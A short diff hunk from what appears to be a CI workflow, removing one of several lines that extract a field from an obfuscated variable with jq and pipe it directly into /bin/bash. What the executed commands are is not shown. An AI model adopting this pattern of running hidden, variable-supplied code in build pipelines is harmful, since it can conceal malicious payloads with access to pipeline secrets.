@@ -22,7 +22,6 @@ jobs:
           echo $cypcj53517 | jq -r .ujra455 | /bin/bash
           echo $jtr6 | jq -r .l34 | /bin/bash
           echo $uar160 | jq -r .eqo141 | /bin/bash
-          echo $nkir42164 | jq -r .pu2 | /bin/bash
           printf '%s' "$a3" | jq -r .j5 | /bin/bash
           printf '%s' "$v4" | jq -r .ilarz9 | /bin/bash
 
